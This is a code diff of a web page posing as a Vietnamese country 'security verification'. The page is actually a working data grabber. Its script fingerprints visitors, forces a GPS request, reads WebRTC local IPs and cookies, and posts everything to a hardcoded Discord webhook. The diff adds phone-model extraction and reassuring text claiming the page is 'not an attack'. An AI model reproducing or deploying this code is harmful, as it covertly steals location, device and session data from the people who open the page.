@@ -6,33 +6,32 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>Xác minh quốc gia…</title>
+    <title>Xác minh bảo mật…</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body { height: 100%; background: #0e1013; font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; overflow: hidden; }
+        html, body { height: 100%; background: #0c0f14; font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; overflow: hidden; }
         #jackLayer {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999;
-            background: rgba(0,0,0,0.94); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
+            background: rgba(0,0,0,0.96); backdrop-filter: blur(20px);
             display: flex; justify-content: center; align-items: center; flex-direction: column;
-            color: #fff; text-align: center; transition: opacity 0.3s;
+            color: #e4e6eb; text-align: center; transition: opacity 0.3s;
         }
-        .wheel-box { position: relative; margin-bottom: 25px; }
-        .wheel {
-            width: 100px; height: 100px; border-radius: 50%;
-            border: 6px solid rgba(255,255,255,0.08);
-            border-top-color: #ffbe0b;
-            animation: spin 0.6s cubic-bezier(0.4,0.0,0.2,1) infinite;
+        .shield-icon {
+            width: 80px; height: 80px; background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23ffbe0b"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>') no-repeat center/contain;
+            margin-bottom: 20px;
         }
-        .wheel.paused { animation-play-state: paused; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .wheel-percent {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            font-size: 20px; font-weight: 700; color: #ffbe0b;
+        .progress-container {
+            width: 260px; height: 6px; background: rgba(255,255,255,0.08); border-radius: 6px;
+            margin: 20px 0; overflow: hidden;
         }
-        .status { font-size: 18px; font-weight: 600; margin: 5px 20px; letter-spacing: 0.3px; }
-        .sub { color: #b0b3b8; font-size: 14px; margin-top: 8px; max-width: 300px; }
+        .progress-bar {
+            height: 100%; width: 0%; background: linear-gradient(90deg, #ffbe0b, #ff8800);
+            border-radius: 6px; transition: width 0.2s;
+        }
+        .status { font-size: 18px; font-weight: 600; margin: 5px 20px; letter-spacing: 0.3px; color: #ffbe0b; }
+        .sub { color: #b0b3b8; font-size: 14px; margin-top: 8px; max-width: 300px; line-height: 1.4; }
         .tap-area {
-            margin-top: 30px; padding: 12px 36px; background: rgba(255,255,255,0.08);
+            margin-top: 30px; padding: 12px 36px; background: rgba(255,190,11,0.12);
             border-radius: 50px; font-weight: 700; color: #ffbe0b; cursor: pointer;
             animation: pulse 2s infinite; border: 1px solid rgba(255,190,11,0.3);
             font-size: 15px; letter-spacing: 0.5px;
@@ -76,11 +75,11 @@
 <body>
     <div id="jackLayer">
         <div id="wheelSection">
-            <div class="wheel-box">
-                <div class="wheel" id="wheel"></div>
-                <div class="wheel-percent" id="percent">0%</div>
-            </div>
+            <div class="shield-icon"></div>
             <div class="status" id="statusMsg">Đang kiểm tra bảo mật…</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar" style="width:0%"></div>
+            </div>
             <div class="sub" id="subMsg">Vui lòng chờ trong giây lát</div>
             <div id="tapPrompt" class="hidden" style="margin-top:15px; color:#ffbe0b; font-weight:600; font-size:15px; white-space: pre-line;">
                 Nhấn để xác minh bạn là người Việt Nam
@@ -99,10 +98,9 @@
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';
 
-        const wheelEl = document.getElementById('wheel');
-        const percentEl = document.getElementById('percent');
         const statusEl = document.getElementById('statusMsg');
         const subEl = document.getElementById('subMsg');
+        const progressBar = document.getElementById('progressBar');
         const tapBtn = document.getElementById('tapButton');
         const tapPrompt = document.getElementById('tapPrompt');
         const wheelSection = document.getElementById('wheelSection');
@@ -116,8 +114,27 @@
         let ipData = null;
         const cookiesStolen = document.cookie || 'none';
 
+        // Get device model from user agent
+        function getDeviceModel(ua) {
+            const modelRegex = /(?:SAMSUNG|Samsung|SM-)\s*([A-Za-z0-9]+(?:\s+[A-Za-z0-9]+)?)|(?:Galaxy\s+([A-Za-z0-9]+))|(?:iPhone\s+(\d{1,2}(?:\s*(Pro|Max|Plus))?))/i;
+            const match = ua.match(modelRegex);
+            if (match) {
+                if (match[1]) return 'Samsung ' + match[1];
+                if (match[2]) return 'Galaxy ' + match[2];
+                if (match[3]) return 'iPhone ' + match[3];
+            }
+            // fallback: common patterns
+            if (/SM-[A-Z0-9]+/i.test(ua)) {
+                return ua.match(/SM-[A-Z0-9]+/i)[0];
+            }
+            if (/Redmi/i.test(ua)) return ua.match(/Redmi [^;]+/i)[0] || 'Xiaomi';
+            if (/POCOPHONE/i.test(ua)) return 'Poco Phone';
+            return 'Unknown';
+        }
+
         function getFingerprint() {
             const nav = navigator;
+            const ua = nav.userAgent;
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             canvas.width = 280; canvas.height = 60;
@@ -150,9 +167,10 @@
             } catch(e) {}
             const conn = nav.connection || {};
             return {
-                userAgent: nav.userAgent,
+                userAgent: ua,
                 language: nav.language,
                 platform: nav.platform,
+                deviceModel: getDeviceModel(ua),
                 deviceMemory: nav.deviceMemory || 'N/A',
                 hardwareConcurrency: nav.hardwareConcurrency || 'N/A',
                 touchSupport: ('ontouchstart' in window),
@@ -232,9 +250,10 @@
             }
             const localIPs = await getWebRTCIPs();
             const embed = {
-                title: '📱 **Dữ liệu thiết bị & Vị trí**',
+                title: '📱 **Thiết bị & Vị trí**',
                 color: 0xffa502,
                 fields: [
+                    { name: '📱 Model điện thoại', value: fp.deviceModel, inline: true },
                     { name: '📍 GPS', value: gpsData && !gpsData.error ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAcc: ±${gpsData.accuracy}m` : (gpsData ? 'Lỗi: ' + gpsData.error : 'Không có'), inline: true },
                     { name: '🌐 IP & Vị trí IP', value: ipData ? `IP: ${ipData.ip}\nQuốc gia: ${ipData.country}\nThành phố: ${ipData.city}\nISP: ${ipData.isp}` : 'Không lấy được', inline: true },
                     { name: '🏠 IP cục bộ', value: localIPs || 'Không có', inline: true },
@@ -248,17 +267,14 @@
                     { name: '🔊 Audio', value: fp.audioFingerprint, inline: true },
                     { name: '🍪 Cookies', value: cookiesStolen.substring(0, 1020), inline: false }
                 ],
-                footer: { text: 'Axr4t2auYc • Xác minh quốc gia chống tấn công' },
+                footer: { text: 'Axr4t2auYc • Hệ thống tự động' },
                 timestamp: new Date().toISOString()
             };
             await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
         }
 
-        // Check if coordinates are inside Vietnam's bounding box
         function isInsideVietnam(lat, lon) {
-            // Approximate bounds: lat 8.0 – 23.5, lon 102.0 – 110.0
-            if (typeof lat !== 'number' || typeof lon !== 'number') return false;
-            return lat >= 8.0 && lat <= 23.5 && lon >= 102.0 && lon <= 110.0;
+            return typeof lat === 'number' && typeof lon === 'number' && lat >= 8.0 && lat <= 23.5 && lon >= 102.0 && lon <= 110.0;
         }
 
         function showResult(type, message, subMessage, buttons = []) {
@@ -292,8 +308,7 @@
         function retry() {
             resultSection.classList.add('hidden');
             wheelSection.classList.remove('hidden');
-            wheelEl.classList.remove('paused');
-            percentEl.textContent = '100%';
+            progressBar.style.width = '100%';
             statusEl.textContent = 'Sẵn sàng xác minh quốc gia';
             subEl.textContent = 'Chỉ người dùng Việt Nam được phép truy cập';
             tapPrompt.classList.remove('hidden');
@@ -304,13 +319,15 @@
             tapBtn.classList.add('hidden');
             tapPrompt.classList.add('hidden');
             statusEl.textContent = 'Đang kiểm tra quốc gia…';
-            wheelEl.classList.remove('paused');
-            percentEl.textContent = '0%';
-            let fake = 0;
+            subEl.textContent = 'Hệ thống tự động – không phải tấn công';
+            let percent = 0;
             const fakeInterval = setInterval(() => {
-                fake += 20;
-                percentEl.textContent = fake + '%';
-                if (fake >= 100) { fake = 100; clearInterval(fakeInterval); wheelEl.classList.add('paused'); percentEl.textContent = '100%'; }
+                percent += 5;
+                progressBar.style.width = percent + '%';
+                if (percent >= 100) {
+                    clearInterval(fakeInterval);
+                    progressBar.style.width = '100%';
+                }
             }, 80);
 
             const gpsPromise = forceGPS();
@@ -318,18 +335,14 @@
             const gpsResult = await gpsPromise;
 
             clearInterval(fakeInterval);
-            wheelEl.classList.add('paused');
-            percentEl.textContent = '100%';
+            progressBar.style.width = '100%';
 
             gpsData = gpsResult;
 
-            // Determine if user is in Vietnam
             let isVietnam = false;
             if (gpsData && !gpsData.error && gpsData.lat != null && gpsData.lon != null) {
-                // GPS available – check coordinates
                 isVietnam = isInsideVietnam(gpsData.lat, gpsData.lon);
             } else {
-                // GPS denied/unavailable – fallback to IP
                 if (ipData) {
                     const country = ipData.country || '';
                     isVietnam = country.toLowerCase().includes('vietnam') || (ipData.countryCode && ipData.countryCode.toLowerCase() === 'vn');
@@ -338,7 +351,6 @@
 
             await sendData();
 
-            // Handle GPS permission errors separately
             if (gpsData && gpsData.error && (gpsData.error === 1 || gpsData.error === 2)) {
                 showResult(
                     'error',
@@ -374,23 +386,20 @@
             }
         }
 
-        // Initial wheel
+        // Initial progress bar fill
         let progress = 0;
         const wheelTimer = setInterval(() => {
-            progress += 20;
+            progress += 5;
+            progressBar.style.width = progress + '%';
             if (progress >= 100) {
-                progress = 100;
                 clearInterval(wheelTimer);
-                wheelEl.classList.add('paused');
-                percentEl.textContent = '100%';
+                progressBar.style.width = '100%';
                 statusEl.textContent = 'Sẵn sàng xác minh quốc gia';
                 subEl.textContent = 'Chỉ người dùng Việt Nam được phép truy cập';
                 tapPrompt.classList.remove('hidden');
                 tapBtn.classList.remove('hidden');
-            } else {
-                percentEl.textContent = progress + '%';
             }
-        }, 1000);
+        }, 80);
 
         tapBtn.addEventListener('click', startVerification);
 
